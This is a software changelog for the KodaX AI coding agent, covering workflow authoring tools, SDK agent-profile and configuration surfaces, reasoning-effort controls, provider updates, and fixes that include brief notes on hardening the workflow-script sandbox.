- **AMAW mode-level `ORCHESTRATION DEFAULT` standing directive (FEATURE_248, prompt-only).** The Worker system prompt gains an AMAW-gated standing directive (mirroring the reference "ultracode" mechanism): substantive work — a multi-file investigation, a design/architecture decision, anything costly to get wrong — defaults to orchestrating multiple cross-checking agents rather than working it alone end to end, while trivial and conversational turns stay solo. A **PLAN-TIME COMMITMENT** flow-fix front-loads the orchestrate-vs-solo call to turn 0 and makes plan items the agents/stages to dispatch. Leak-closed via a new optional `ManagedRolePromptContext.amawOrchestrationAvailable` field, so AMA and SA prompts stay byte-identical. Narrowed-SHIP: acceptance is task-inception activation; mid-task re-architecture is a documented non-goal, and absolute activation is model-ceiling-limited on current coding-plan aliases.
- **Space SDK capability hardening (R1-R6).** Per an adversarial review of the six Space SDK capabilities: model-level overrides are honored on the default model and a `resolveWireEffort` helper is added; LLM-triggered skill dynamic-context is routed through the host policy (R4); a rejected `reasoning_effort` self-heals across turns (R5); plus the host-facing authoring entrypoint and resume-replay telemetry (R1/R2) noted above.
- **ark-coding lineup refreshed to Ark's official model catalog.**

### Fixed

- **Workflow `tokenBudget` of `0` / `null` / negative now means unbounded** instead of being clamped to a 1-token budget — expressing "no limit" as `0` from one of a host's launch paths previously wedged the whole run. `maxAgents` / `maxConcurrency` keep their count floor of 1.
- **The built-in parallel-investigation workflow reads structured child findings instead of the timing-fragile `finalText`.** A child's smart digest is delivered asynchronously (after its terminal event), so a synthesis step could receive empty findings ("总评:(无) / 发现:无"); it now reads the structured result.
- **Authored + generated workflows read `result.structured`, not the top-level result or `finalText` (KodaX-Space).** Both authoring surfaces — the `run_workflow` tool description and the blind generator prompt — are taught to read a child's validated object off `result.structured` (a review workflow that declared an `outputSchema` but read fields off the top-level result produced an empty report). The sandbox source policy also now preserves `${...}` interpolation inside template literals so a `${process.cwd()}` no longer evades the forbidden-pattern scan and crashes at runtime, bans computed `globalThis[...]` access, and `wf.log` tolerates a bare string.
- **The Sidecar Verifier's feedback renders under its own identity, not `[Evaluator]`.** Three UI seams surfaced the legacy `evaluator` role name as a phantom `[Evaluator]` agent (status-line label-lag on a revise, the persisted transcript, and the restored synthetic sidecar message on `kodax -c`); all three now attribute to the `⚡ Sidecar Verifier` identity.
- **`getCustomProviderModelDescriptors` honors a `models[]` override on the default model.** The custom-provider descriptor-listing SDK surface returned a bare `{id}` descriptor for a custom provider's default model even when it had a `models[]` entry (context window / max output / reasoning profile), disagreeing with `getCustomModelCapabilities`; both SDK surfaces now agree (R3 regression test added).

## [0.7.58] - 2026-07-02

> Scope note: a feature + hardening release. **FEATURE_246** delivers Claude-Code-harness
> workflow *authoring* parity (ADR-044/046/047/048): the Worker can now author and run a
> workflow inline via a model-callable `run_workflow` tool — it scouts the codebase first and
> bakes concrete findings into child prompts — instead of always delegating to the context-blind
> `sideQuery` generator (now demoted to a headless/SA fallback). It adds structured child output
> (`outputSchema`), a no-barrier `wf.pipeline`, same-session resume (`resumeFromRunId`), nested
> workflows, and `/workflow` command intelligence. **ADR-045** closes a correctness gap where a
> tool call truncated mid-JSON could execute with a corrupt payload. **ADR-046** lifts the neutral
> workflow run-lifecycle manager to `@kodax-ai/agent` for non-coding SDK hosts. Two v0.7.57
> regressions are fixed (thinking display for kimi/minimax/ark coding models and for custom-provider
> non-Claude relays). The release also keeps the v0.7.57 SDK public-surface alignment work (effort /
> timeout / capability exports). **Breaking for workflow capsules and SDK embedders — see Removed.**

> **FEATURE_247** adds a profile-gated SDK agent-profile surface for embedders (KodaX-Space Partner): an opaque `KodaXAgentProfile` that injects identity / instructions, narrows tool visibility, binds + attributes the Sidecar Verifier, reports an `onEffectiveConfig` snapshot, carries structured session / runtime metadata across `fork()`, and exposes an imperative `compactSession()` — all no-ops when no profile is set (the default Coding Agent stays byte-identical). The **config surface (M2)** expands: model tiers and the remaining env-only settings become `config.json` / `KodaXOptions` keys (the matching `KODAX_*` env var still overrides), and per-run config is isolated via `AsyncLocalStorage` so concurrent SDK sessions in one process do not read each other's settings. **FEATURE_221** makes the bundled self-knowledge manual curatable and white-labelable so a re-branded product no longer leaks the KodaX name / config paths through the model's tool surface or system prompt.

### Added

- **Inline workflow authoring — the `run_workflow` model-callable tool (FEATURE_246 Part A, ADR-046/047).** In AMA/AMAW the Worker can write a self-contained workflow script directly — investigating with its own tools first, then baking concrete findings into each child prompt — and run it through the **unchanged** sandbox + static-validation + postcondition-verification pipeline. This replaces the context-blind `sideQuery` generator as the primary interactive path; the generator survives only as a headless/CI/SA fallback. The tool description doubles as a pattern textbook (adversarial verify, judge panel, loop-until-dry, multi-modal sweep, completeness critic) per ADR-033.
- **`/workflow` command intelligence (FEATURE_246, ADR-047).** In AMA/AMAW, `/workflow create <request>` now redirects to the Worker (scout-then-author) instead of blind-generating; `/workflow <free text>` (when the first word is not a known subcommand or saved-workflow name) is shorthand for `create`; bare `/workflow` still lists. The authoring turn is elevated to AMAW intelligence for that turn only.
- **Structured child output via `outputSchema` (FEATURE_246 Part B).** A spawned child can be given a JSON-Schema subset (`type/enum/required/properties/items/additionalProperties`); the workflow layer extracts, validates, and runs one bounded repair turn on a hard miss, then exposes the parsed object as `WorkflowTaskResult.structured` (no `JSON.parse` in the script). Unsupported schema keywords (`$ref`/`oneOf`/`allOf`/…) are rejected at declaration time rather than silently ignored.
- **`wf.pipeline` no-barrier staged primitive (FEATURE_246 Part C).** `wf.pipeline(items, ...stages)` streams each item through ordered stages with no inter-stage barrier (slowest single-item chain, not sum-of-stages); a throwing stage drops only that item to `null` and abort signals propagate through.
- **Same-session workflow resume (FEATURE_246 Part D, ADR-048).** `run_workflow` accepts `resumeFromRunId`; unchanged agent calls replay instantly from a content-addressed result cache (`SHA-256(canonical spawn input) # occurrence`) and only edited/new calls re-run. To keep replay deterministic, `Date.now()`, `Math.random()`, and argless `new Date()` now throw inside workflow scripts (pass timestamps via `args`).
- **Workflow Part E ergonomics (FEATURE_246).** Nested `wf.workflow(name, args)` runs a saved/built-in workflow inline as a one-level sub-step (sharing the run's concurrency/budget/abort/counter); `wf.runAgent`/`wf.parallel` thunks resolve to `null` on a child failure (use `.filter(Boolean)` instead of `try/catch`) while run-control errors still propagate; `WorkflowSpawnAgentInput.phase` tags an agent into a named progress group; and `WorkflowSpawnAgentInput.effort` threads per-child reasoning depth.
- **Neutral workflow run-lifecycle manager in `@kodax-ai/agent` (ADR-046, SDK).** `createWorkflowRunManager` / `getDefaultWorkflowRunManager` now live in the agent layer, so a non-coding SDK host that supplies its own backend + event subscriber gets full start/pause/resume/stop/settle run management without importing `@kodax-ai/coding` (the coding manager becomes a thin adapter with the same API).
- **Annotated `config.example.jsonc` on first launch.** When KodaX starts with no `config.json`, it now also writes a commented reference file documenting the custom-provider reasoning matrix (both compat dialects, effort tuning, the real-Claude `native-adaptive` path, and the DeepSeek `replayReasoningContent` caveat).
- **`@kodax-ai/kodax/llm` exports for effort / timeout / capability tooling.** The LLM subpath now exports the SDK timeout-config helpers (`resolveLlmTimeoutConfig`, `parseTimeoutSecEnvMs`, `timeoutSecToMs` + `KodaXLlmTimeoutConfig` / `KodaXResolvedLlmTimeoutConfig`) and the passive capability-learning helpers (`capabilityCacheKey`, `narrowReasoningProfile`, `sanitizeCapabilityCache` + `CapabilityCache` / `CapabilityCacheEntry` / `CapabilityCacheSource`), so embedders can drive effort pickers and capability caches from the same source of truth the REPL uses.
- **Reasoning effort surface for embedder UIs.** `resolveModelCapabilities(...)` exposes `reasoningProfile.supportedEfforts` / `defaultEffort` so a host can build effort selectors dynamically (covering `xhigh` / `max` / custom-provider effort names) instead of a fixed five-option list.
- **Embedder guide §15 — Space v0.7.57 follow-up ledger.** Documents the consumer integration decisions (custom-provider `reasoning: { efforts, default }` form, dynamic effort selector, repo-intelligence prewarm status, `relationship_scan` UI entry, Quick Ask / `sideQuery`) against the SDK contracts already exposed here.
- **Workflow generation robustness (FEATURE_245).** The dynamic-workflow generator now fails closed on more contract mistakes before a script ever runs: static rejection of string-literal task IDs passed to `wf.wait/snapshot/send/stop`, smoke-time assertion that task APIs receive real `taskId` values (not agent names) and that `evidenceRefs` use the `file:`/`diff:`/`finding:`/`task_id:` contract, a multi-scenario adversarial smoke pass (default / variant results / unverified-success / empty-rerun-args) that exercises data-dependent branches, randomized smoke task IDs, and hardened generator + repair prompts.
- **FEATURE_247 — SDK agent-profile surface (KodaX-Space Partner).** A new opaque `KodaXAgentProfile` (`options.context.agentProfile`) lets an SDK embedder run under a named profile. R1: identity + instructions are injected ahead of role assembly (SA via `systemPromptOverride`, AMA via the role prompt). R2: a `toolVisibilityPolicy` narrows the model-visible tool list before it is built. R3: the profile's verification standard binds the Sidecar Verifier and each verdict is attributed to the profile. R4: an `onEffectiveConfig` event reports the effective agentMode / tool scope / verification / resolved verifier at run start. R5: structured `profile` + `runtimeInfo` metadata rides on results and is inherited across `fork()`. R6: an imperative `compactSession()` on the session SDK. R7: session / profile / toolCall attribution is threaded into the tool execution context and onto inline-workflow process events. R8: AMA tool events are attributed to the session + profile. R9: a new `reads-network` side-effect class (`isToolNetworkRead`) tags read-only network tools (`web_search`, MCP read / prompt) so a profile can allow network reads without granting mutation. Every path is profile-gated: with no `agentProfile` the default Coding Agent is byte-identical.
- **Model tiers + remaining env-only settings as config (M2).** Semantic model tiers and the settings that were previously env-only now read from `config.json` / `KodaXOptions`, with the matching `KODAX_*` env var still overriding (precedence: SDK > CLI > shell env > config > default). The tier env vars are documented in `config.example.jsonc`.
- **Configurable workflow child-agent concurrency (FEATURE_246 follow-up).** `run_workflow` child fan-out now runs under a configurable ceiling (default 8; previously effectively unbounded up to the lifetime cap), resolved run-scoped `KodaXOptions.workflow.maxConcurrency` → `KODAX_WORKFLOW_MAX_CONCURRENCY` → `config.json` `workflow.maxConcurrency` → default, clamped to `[1, 32]`. A single `wf.parallel` / `wf.pipeline` call that exceeds 4096 items is now rejected fail-fast instead of over-scheduling.
- **`task_output(runId)` peeks a running workflow's live progress (FEATURE_246 follow-up).** Calling `task_output` on a background run's id now renders its live phase plus running / finished agents (taught in the `run_workflow` reply) instead of returning `not_found`.
- **Curatable / white-labelable self-knowledge manual (FEATURE_221).** A new additive `selfManual.baseTopics` seeds all base topics (default — byte-identical), none (`[]`, full white-label replace), or an explicit subset; `KODAX_UNDERLYING_CAPABILITY_TOPICS` is the recommended set of mechanism topics (providers / config / permissions / tools / skills / extensions / mcp / repo-intelligence / sessions / sdk / custom-providers) a product built on KodaX inherits; and `MANUAL_REGISTRY` + `KodaXManualTopic` / `KodaXManualSource` types are now exported so a consumer can read base topic bodies at build time.
- **`ask_user` multi-select protocol (FEATURE_222, KodaX-Space partner request).** The shared agent-layer user-interaction primitive completes its multi-select contract: `UserInteraction.askUser` → `Promise<string | string[]>` and `askUserMulti` → `Promise<Record<string, string | string[]> | undefined>` (a backward-compatible superset — a host returning a plain string still satisfies it); `ask_user_question` gains `min_selections` / `max_selections` bounds enforced by the REPL reference host; the `__back__` sentinel is promoted to an exported `ASK_USER_BACK_SIGNAL` (single source of truth); and a multi-select result now emits `{choices: [...]}` (single-select `{choice}` unchanged — default path byte-identical) so option values containing `", "` are no longer corrupted by a join.

### Changed

- **Workflow activation semantics are mode-distinct (FEATURE_246, ADR-047).** SA strips the sub-agent/workflow tool cluster and rejects execution-class `/workflow` subcommands; AMA has no standing `run_workflow` (the Worker never self-activates from natural language) but `/workflow` elevates the authoring turn to AMAW for that turn; AMAW has a standing `run_workflow` and may self-activate. The host no longer intercepts natural language with a keyword regex to auto-start a workflow — text flows to the Worker, which scouts and authors. `WorkflowInvocationAction` narrows to `'none' | 'suggest'` (`'auto-start'` removed).
- **`dispatch_child_task` prefers `run_workflow` only where it exists (FEATURE_246, ADR-033).** The "prefer `run_workflow` for synthesizable fan-out" nudge appears in the `dispatch_child_task` description only when AMAW's workflow host is wired, so plain-AMA Workers are never steered toward a tool they lack.
- **`run_workflow` is async / idle-yield and completed workflow agents leave a digest in history (FEATURE_246, ADR-049).** Dogfood (an 18+ min self-review) showed the inline path under-delivered vs `dispatch_child_task` / the slash path: it blocked the turn for the whole run (REPL locked, follow-ups queued) and completed workflow agents vanished from scrollback. `run_workflow` now reuses the FEATURE_155 idle-yield machinery — it registers the run in the Worker's `childTaskRegistry`, returns a `task_id` immediately, and the synthesized result arrives later as a `<task-completed>` block (the Worker can keep working / the user can keep chatting); a blocking fallback remains for SDK/headless (no registry, or `KODAX_ASYNC_WORKFLOW=0`). A new `KodaXEvents.onWorkflowAgentDigest` hook forwards each child agent's terminal/summary event so both REPL surfaces (Ink + console) write its digest to the transcript via `formatWorkflowAgentDigest`, matching the slash path and `dispatch_child_task`.
- **Multimodal input-artifact canonical layer moved to `@kodax-ai/agent`.** Queued multimodal input (`KodaXInputArtifact` plus the construction / validation / enqueue helpers) now lives in the agent layer, since queued multimodal input is not coding-specific; `@kodax-ai/coding` keeps compatibility re-exports so existing imports continue to work.
- **Per-run config isolation via `AsyncLocalStorage` (SDK).** Run-scoped settings (`disablePromptCache`, `maxOutputTokens`, `lsp`, …) resolve from an `AsyncLocalStorage` store first, then env, so two concurrent SDK sessions in one process no longer read each other's config.
- **First-class Sidecar Verifier message + retrospective relocation.** The Sidecar Verifier's output is now a first-class host-rendered message (with `_source` a first-class field) and the retrospective moves onto the sidecar surface.
- **Conversation-history prompt-cache breakpoint (perf).** Anthropic-compat requests place an incremental cache breakpoint on the settled conversation prefix (breakpoint 3, within Anthropic's 4-breakpoint limit) so the growing transcript is not re-billed as uncached input every turn.
- **`MEMORY.md` mtime read cache (perf).** The auto-memory file is re-read only when its mtime changes; the full memory-rules text is kept.
- **The Worker can stop → improve → re-run a workflow (FEATURE_246 follow-up).** An async `run_workflow` run now mints a per-run `AbortController` registered under its `task_id` (the same registry `task_stop` aborts), so on a mid-run goal change the Worker can `task_stop(runId)` a running workflow — previously only the user could, via `/workflow stop` — and re-run with `resumeFromRunId` so finished agents replay from cache and only the changed work re-runs.
- **kodax_manual is white-labelable (FEATURE_221).** The `kodax_manual` tool description and the self-knowledge routing rule are re-branded from `selfManual.productName` (the `~/.kodax/config.json` + `KODAX_*` clauses are gated to the default `KodaX` product), so a re-branded product no longer surfaces the KodaX name / config paths in the model's tool surface or system prompt. The tool *name* stays `kodax_manual` (a stable identifier), and default output is byte-identical.
- **Per-agent live rows for inline workflow runs.** The REPL child-activity view shows one bounded row per running workflow child — name plus its own elapsed (`agent r1 · 1m20s`), capped at 5 + "+N more" and keyed by unique per-spawn id so a same-named fan-out does not collide; once a child shows a concrete tool action, churny thinking / stream tokens no longer overwrite it. (A separate redundant workflow live-tree surface was reverted in favor of this.)
- **Language continuity across SA / Worker / child / workflow surfaces.** The "answer in the user's request language" rule (previously only in the AMA Worker's closing contract and the `/workflow` NL generator) is ported to the shared `EXECUTION_GUIDANCE` (SA + Worker), a dispatch-authoring objective rule, the child-agent system prompt, and the `run_workflow` tool description — so single-agent replies and dispatched / workflow child reports no longer drift to English on a non-English request (code / paths / evidence stay in source form). The hard-won Sidecar Verifier prompt is deliberately untouched.

### Fixed

- **Truncated tool input can no longer execute a corrupt payload (ADR-045).** A provider response cut mid-JSON (e.g. by `max_tokens`) could pass the incomplete-call check and run a malformed `write`/`edit`/`bash` input. Salvaged-but-truncated blocks — and any salvaged *mutating* tool even on a clean stop — are now routed into the bounded retry instead of executing; salvaged read-only tools on a clean stop still pass through.
- **Alternation-preserving history repair (ADR-045).** When a truncated turn hits the retry cap, every visible `tool_use` gets a synthesized `tool_result` (error for untrusted, "skipped" for complete siblings) so valid sibling calls are not lost; a turn fully emptied by orphan-stripping holds an empty-text slot instead of producing `user,user` (an Anthropic 400); an Anthropic stream that cuts after `stop_reason` returns the partial instead of re-billing the whole turn; and a unique `Write`→`write` case/separator mismatch is corrected at one point in the pipeline.
- **Thinking display restored for `kimi`/`minimax`/`ark` coding models (v0.7.57 regression).** The ADR-042 single-track migration moved `kimi-k2.7-code` / `minimax-m2-always` to prompt-only presets that early-returned without sending `thinking: { type: 'enabled' }`, so Anthropic-compatible servers emitted no reasoning content. The enable param is restored (effort stays prompt-only).
- **Thinking restored for custom-provider non-Claude relays + `supportsThinking` is a true master off-switch.** Non-Claude models behind OpenAI/Anthropic-compatible relays regained thinking display: bare `supportsThinking: true` stays passive on `openai-compat` (no wire toggle, reasoning parsed regardless), a new `anthropic-reasoning-effort` strategy serves effort-tunable non-Claude Anthropic endpoints, and a relay that rejects the wire shape now degrades to a param-free retry. Separately, `supportsThinking: false` now overrides any per-model `reasoningProfile` / `reasoning` / `reasoningCapability` (resolved profile, every capability surface, and the runtime all agree on no-thinking, with a startup warning on contradiction); the bare-`supportsThinking: true` "passive" case reports `reasoningCapability: 'none'` consistently across all three query surfaces.
- **Inline `run_workflow` hardening (FEATURE_246).** Many gaps found in adversarial self-review are closed: `run_workflow` was silently inoperative on Worker natural-language turns (the runs dir was wired into `/workflow` closures but not the main-loop session options); the lifted run-manager re-introduced an eager-start microtask and a duplicate process-event sink (double-emitted progress); the sandbox `wf.parallel`/`wf.pipeline` lenient-failure and run-control propagation did not reach inline scripts; `globalThis.Math`/`Date` bypassed the determinism guards; `resumeFromRunId` allowed `../` path traversal; the six built-in pattern-template scripts would NPE on a now-nullable child result; `evidenceRefs` and `task_id:` references are validated at every spawn (not only in the generator smoke pass); `wf.output/snapshot/send/stop` on an unknown task ID now throw like `wf.wait`; and an inline workflow infers its locale from the run instead of hardcoding `en`.
- **`maxed_out` recovery no longer emits an empty nudge.** When the only incomplete call in a capped turn is a hidden managed tool, the recovery message was empty (dropped by OpenAI / sent as wire `...` on Anthropic); it now pushes a synthetic text nudge.
- **`/skill` tool display shows the skill name.** A model-invoked skill rendered as a bare `skill` badge instead of `skill - <name>`.
- **Workflows no longer discard completed work on a mid-run failure (FEATURE_245).** When a generated workflow throws after some child agents have already completed (e.g. a script that calls `wf.wait("<agent-name>")`), the run now surfaces the completed children's outputs alongside the error instead of a bare `Workflow failed` message. Failure hints also point at `/workflow revise` for repair.
- **Embedder guide `setReasoning` example used an invalid mode.** `session.setReasoning('medium')` was corrected to a valid `KodaXReasoningMode` value (`'balanced'`); `'medium'` is an effort/depth value, not a reasoning mode.
- **Timely todo updates.** The todo reminders change from one-shot to a recurring throttle plus a completion-cadence prompt, so a stale plan is nudged again instead of only once.
- **Compaction traces no longer corrupt the TUI.** The compaction stderr trace is gated behind `KODAX_DEBUG_COMPACTION`; unattributed `console` writes below Ink's live region are removed.
- **Duplicate rate-limit line suppressed.** A provider rate-limit notice that rendered twice (retry-after + provider callback) is de-duplicated.
- **`WorkflowToolHost` contract exported + `.d.ts` built in CI.** The SDK now ships the `WorkflowToolHost` type and its declaration file.
- **Prompt-cache precedence, invalid `maxOutputTokens`, and TUI-safe streaming logs.** An SDK caller's explicit `disablePromptCache: false` now re-enables caching over `KODAX_DISABLE_PROMPT_CACHE=1` (the message-level breakpoint honored the same run-scoped switch it had been missing); a run-scoped `maxOutputTokens` of `0` / `-1` / `NaN` is ignored instead of reaching the API as an invalid `max_tokens`; and the mid-stream "[Tool Block Invalid]" logs are gated behind `KODAX_DEBUG_TOOL_STREAM` so they cannot corrupt the Ink TUI.
- **Workflow verification warnings surfaced + stricter `outputSchema` + bounded run state.** A run that completes with a warn-only child verification failure now reports the failing child in the `run_workflow` reply instead of silently succeeding; `outputSchema` value-constraint keywords (`minimum` / `pattern` / `minItems` / …) and `additionalProperties` in schema-object form are rejected at declaration (they were silently unenforced); the run-manager registries are bounded; and a run stopped while paused is recorded as stopped, not failed.
- **Paste temp files with any KodaX prefix are pruned.** `prunePasteTmpDir` matches any KodaX-written paste file by shape, not just the default `paste-` prefix, so a custom `fileNamePrefix` (e.g. a Partner surface's) no longer leaks temp files.
- **Reasoning-effort v2 UI: Ctrl+T cycling, status color, and `/effort` normalization.** Ctrl+T now clamps a stale off-cycle label onto the active model's effort ladder instead of wrapping to `off` (the V1 bug that silently disabled thinking on a model switch) and steps from the effort the user actually sees (plan-mode effort, not the raw session field); the status bar colors by the *effective* tier, so a configured tier that folds to `off` dims instead of implying thinking is still active; and `/effort` always normalizes `reasoningMode` to `off`/`auto` and writes the full `{reasoningMode, thinking}` pair, so a stale legacy value never lingers and `/effort` round-trips with the Ctrl+T write.
- **Unescaped-apostrophe workflow parse errors get a fix hint.** The generated-workflow syntax check appends a quote-escaping hint on the common unescaped-apostrophe parse error so the repair retry fixes it in one pass.
- **`runKodaX` / `startKodaX` establish the run-scoped config so per-run SDK overrides are honored.** The `AsyncLocalStorage` run-scoped readers were in place, but the SDK entrypoints never *established* the store around the run, so per-run overrides (model tiers / `maxOutputTokens` / `disablePromptCache` / `lsp` / workflow concurrency) fell back to shared `process.env` — breaking `SDK > env` precedence and per-run isolation for concurrent sessions. Both entrypoints now wrap the whole run in the store. `startKodaX` also maps `agentProfile.instructions → systemPromptOverride` for the SA path (FEATURE_247 R1), and `custom-provider` `supportsThinking: false` normalizes the deprecated `reasoningCapability` to `'none'` across every query surface (single-track).
- **The neutral workflow run-manager always reaches a terminal status.** A run now settles to a terminal state even when a caller-injected `onError` / `classify` throws, and a synchronous `runFn` throw no longer double-fires a throwing `onError` (the sync path rejects into the same single `.catch(onError)` as an async rejection).
- **Incomplete-tool retry no longer produces a `user,user` 400.** The retry popped the assistant turn and pushed a fresh user turn, creating an adjacent `user,user` pair that strict Anthropic gateways reject (the v0.7.58 salvage guard had widened the trigger); it now merges the nudge into the preceding user turn and flags it `_synthetic` only when that turn is pure `tool_results` (so a real initial-prompt turn stays visible on restore and is not skipped by the sidecar's "last real user" gate). The workflow sandbox `Date` guard also throws on `Date.prototype` / `Date.constructor`, closing the `Date.prototype.constructor.now()` determinism bypass.
- **`openai` friendly-form reasoning effort + `ask_user` range validation.** A friendly-form provider declaring `openai-chat-effort` did not send `reasoning_effort` on the provider-toggle branch (an early return dropped it; pure-toggle providers were unaffected). Separately, `ask_user` rejects an unsatisfiable multi-select range (`min > max`, or `min >` option count) at the tool boundary instead of trapping the user in an unconfirmable dialog; `min_selections: 0` makes an empty selection valid; and construction / self-modify prompts force single-select so an option value containing `", "` cannot be corrupted.
- **Inline `run_workflow` per-agent digests render inline + in the query's language (`kodax -c`).** A completed child's digest was appended to static history while the spawning Worker still owned the foreground turn — but static history renders *above* the live foreground stack, so every digest was pinned above the whole Worker turn and persisted that way; it now routes through the foreground ledger (the documented MED-6 layering rule) when a managed Worker owns the turn, committing in temporal order. Locale is inferred from the child's own summary / name instead of the racy live-status ref, so the last digest (arriving after teardown) is no longer forced to English chrome.

### Removed

- **Workflow sandbox now forbids non-deterministic clocks/RNG (BREAKING for capsules).** `Date.now()`, `Math.random()`, and argless `new Date()` throw inside workflow scripts so same-session resume can replay deterministically. A saved workflow capsule that calls these will fail on first run after upgrading — pass timestamps/seeds via `args`.
- **Workflow auto-start plumbing (BREAKING for SDK embedders).** `WorkflowInvocationAction`'s `'auto-start'` member and `WorkflowHostPolicy.autoStart` are removed (no runtime effect after the host stopped intercepting natural language); `WorkflowInvocationPolicyInput` reduces to `{ source }`. `createWorkflowRunManager` / `getDefaultWorkflowRunManager` moved from `@kodax-ai/coding` to `@kodax-ai/agent` (re-exported, but deep imports should retarget the agent layer).

## [0.7.57] - 2026-06-28

> Scope note: a large architecture release for custom-provider / SDK embedders, built on three ADRs plus a repo-intelligence rewrite. **ADR-041** stops persisting placeholder `...` empty replies into history. **ADR-042** collapses the `mode`/`depth` reasoning dual-track into a single `effort` axis (wire behaviour preserved — `effortToThinkingDepth` mirrors the old `effort→mode→depth` derivation, so every provider×effort still emits the same `reasoning_effort` / `thinking.budget_tokens`). **ADR-043** turns harness routing into static LLM judgment: the keyword router, AMA-controller, fanout-scheduler and prompt-overlay machinery are deleted in favour of a shared static `EXECUTION GUIDANCE` block + an objective-metric Sidecar Verifier gate (`harnessProfile` is retained as a constant `H0_DIRECT`). Repo-intelligence moves from an external host/premium daemon to a fully built-in local semantic index engine with a worker sidecar. **This release contains breaking changes for SDK embedders and custom-provider authors — see the migration notes under Removed / Changed.**

### Added

- **Reasoning effort v2 controls.** New `effort` axis end to end: `effort` / `planModeEffort` config, `--effort` CLI flag, `KODAX_EFFORT` env var, the `/effort` REPL command, Ctrl+T effort cycling, and effort-first status display. Custom providers declare support with `reasoning: { efforts: [...], default: "..." }`.
- **`zai-coding` provider.** Zhipu's overseas mirror (`api.z.ai/anthropic`), keyed by `ZAI_CODING_API_KEY`.
- **Built-in semantic repo-intelligence engine.** ~17 `semantic-*` modules (multi-language symbol extraction for ts/js/py/java/go/rust/cpp, build cache, materialize, workspace) plus a worker sidecar (`dist/semantic-worker.js`). New `relationship-scan` tool and a `repo-intelligence-index` perf benchmark + baseline.
- **Passive capability learning.** `~/.kodax/capability-cache.json` records provider/model effort rejections (rebuildable; clear with `/provider forget-capability`); `/provider probe` and `/agents` (idempotent `AGENTS.md` bootstrap) commands.
- **Multimodal input artifacts** extended; lean review command.

### Changed

- **Reasoning control is single-track `effort` (BREAKING).** `KodaXReasoningRequest.mode` / `.depth` were removed — use `.effort`. Legacy custom-provider fields (`reasoningCapability` / `reasoningPreset` / `supportsThinking`) are `@deprecated` and auto-migrated to the new `reasoning` shape at load; the `setThinkingLevel` / `provider:before` hooks now carry effort values rather than legacy mode strings.
- **Harness is static (ADR-043).** `harnessProfile` / `topologyCeiling` / `upgradeCeiling` are now the single `H0_DIRECT` tier (retained as accurate constants for REPL/status/checkpoint schema). The REPL status bar no longer shows a per-task harness prefix.
- **Repo-intelligence config (BREAKING).** `repoIntelligenceMode` enum narrows from `auto/off/oss/premium-shared/premium-native` to `auto/off/light/full` (old `oss`/`premium-*` values are rejected). The env var `KODAX_REPO_INTELLIGENCE_MODE` is renamed to `KODAX_REPO_INTELLIGENCE`; `repointelEndpoint` / `repointelBin` config and `KODAX_REPOINTEL_ENDPOINT` / `_BIN` env vars are removed.
- **`package.json` `files`** tightened from `"dist"` to an explicit glob list (includes `dist/semantic-worker.js`, `dist/builtin`, `provider-capabilities.json`).

### Removed

- **Routing / harness machinery (BREAKING for embedders).** Removed the LLM-router cluster, the AMA-controller (`buildAmaControllerDecision` + `KodaXAmaProfile/Tactic/FanoutPolicy/ControllerDecision` types + the `amaProfile`/`amaTactics`/`amaFanout` runtime fields), the `fanout-scheduler` subsystem (`buildFanoutSchedulerPlan` / `createFanoutSchedulerInput` / `applyFanoutBranchTransition` + `KodaXFanout*` types), and `buildPromptOverlay` / `HARNESS_PROFILE_OVERLAYS` / `EXECUTION_MODE_OVERLAYS`. `KodaXAmaFanoutClass` is renamed to `KodaXChildFanoutClass`. None of these were in the SDK embedder guide.
- **Repo-intel external clients (BREAKING).** `premium-client.ts` / `query-fallback.ts` and the `clients/repointel` host skill are deleted; `warmRepoIntelligenceRuntime` / `REPOINTEL_DEFAULT_ENDPOINT` are gone. Import paths move from `./repo-intelligence/query.js` → `./semantic-types.js` / `./semantic-render.js`, and `./premium-client.js` → `./runtime.js`.
- **`reasoning-overrides.ts`** and the CAP-019 auto-reroute middleware (dead after the harness static-ization).

### Fixed

- **Empty-content contract (ADR-041).** Empty assistant turns are stored as `{ text: "" }`; the placeholder `...` is synthesized wire-only by the Anthropic/OpenAI serializers and never persisted into history. Anthropic gained orphan tool_use/result repair.
- **Sidecar Verifier objective-metric gate.** Fires on write/risky-shell/round/plan/unattributed-write signals from a mutation tracker that now covers every `mutates-fs` registry tool (incl. `multi_edit`), counts touched lines as `max(old,new)`, and tracks handler-computed-path writes (`undo` / `worktree_*` / `stage_*`) via `unattributedWriteOps`. Restored the SA Direct Path Rule + caller overlay that an interim ADR-043 step had dropped.
- **Deterministic child-task IDs** (monotonic counter, not `Math.random`/`Date.now`); rate-limit / context-limit provider-error classification; MCP capability-id normalization; child wait-expired review hardening; `glm-5.2` maxOutputTokens 131072 → 128000.
- **Source-comment encoding.** A host-codepage (cp936) editor save mangled Unicode punctuation — em/en-dashes, arrows, check marks and section signs — into mojibake across 20 source files and the SDK embedder guide; all occurrences are restored against the clean v0.7.56 blobs (Chinese comments were unaffected). Added `.editorconfig` (charset=utf-8) to prevent recurrence.
- **Self-knowledge manual.** Synced the `config` topic to the new `effort` / `planModeEffort` / `KODAX_EFFORT` reasoning axis and added `/effort` + `/provider` to the `commands` topic.

## [0.7.56] - 2026-06-25

> Scope note: a feature release pairing **FEATURE_239** (a public SDK media-input contract so host apps like KodaX Space can build image paste/drop without importing REPL internals) with **FEATURE_240** (provider-neutral `stopReason` normalization), plus a GLM/Kimi provider-model refresh. No LLM-facing prompt surface changed (these are SDK + runtime infrastructure), so per ADR-033 / FEATURE_104 no prompt eval is triggered. The new media helpers ship behind dedicated unit tests; FEATURE_240 ships a cross-protocol integration test (`agent.stop-reason.test.ts`).

### Added

- **FEATURE_239 - SDK media input artifacts.** Added `@kodax-ai/kodax/media` and `@kodax-ai/coding/media` with shared image clipboard, normalization, persistence, artifact construction, model input capability, and artifact validation helpers. REPL paste internals now re-export the shared media helpers, and runtime validation rejects unsupported image/video/file artifacts before provider send.

### Changed

- **GLM-5.2 and Kimi K2.7 Code on `ark-coding`.** The `ark-coding` provider now serves `glm-5.2` (1M context) and `kimi-k2.7-code` (256K context); the `kimi` provider also exposes `kimi-k2.7-code`. Effective context-window / max-output values are pinned by regression tests.
- **SDK typing note.** `KodaXInputArtifact.mediaType` is now narrowed from `string` to `KodaXImageMediaType` (`image/png` | `image/jpeg` | `image/webp` | `image/gif`). The runtime shape remains image-only for v0.7.56, but TypeScript SDK consumers passing arbitrary media strings may need to narrow or validate them first.

### Fixed

